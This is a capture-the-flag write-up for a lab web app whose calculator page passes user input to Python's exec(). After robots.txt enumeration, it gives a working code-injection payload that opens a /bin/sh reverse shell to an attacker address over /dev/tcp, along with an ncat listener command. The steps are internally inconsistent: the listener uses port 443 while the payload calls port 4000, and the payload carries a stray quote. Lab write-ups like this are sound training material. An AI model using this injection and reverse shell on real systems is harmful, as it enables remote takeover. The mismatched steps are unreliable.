# clays-magic-funhouse-ctf Writeup

Hint(s):

- `Visit the robots.txt page to get a list of sites`
- `The calculator page is vulnerable, how does it perform calculations? How can code be injected into the prompt?`
- `0; import os`
- `Use ncat to start a reverse shell`


## Solution

1. Goto CTF URL, for solution purposes let's say 127.0.0.1:5000, but it will be different when it's actually ran.
2. Navigate to 127.0.0.1:5000/robots.txt. This will itemize the pages on the website. Go through each page.
3. The calculator page is the vulnerable page. The input is ran through the exec() function without sanatization
4. Type "0;import os" in the textbox and submit.
5. In a terminal, determine your ip, i'll use 10.0.0.1 but of course it will be something different.
6. Listen for a remote connection
```
sudo ncat -nvlp 443
[sudo] password for claythess: 
Ncat: Version 7.80 ( https://nmap.org/ncat )
Ncat: Listening on :::443
Ncat: Listening on 0.0.0.0:443
```
7. On the calculator textbox, run 
```
0;os.system('/bin/bash -c "/bin/sh -i >& /dev/tcp/10.0.0.1/4000 0>&1"')"
```
8. This will connect to your remote shell listener in your terminal instance
9. ls, and cat flag.txt to find the flag

Flag: 
```
I want to have time to look for my children, and see how many of them I can find. 
Maybe I shall find them among the dead. 
Hear me, my Chiefs! I am tired; my heart is sick and sad. 
From where the sun now stands I will fight no more forever.
```
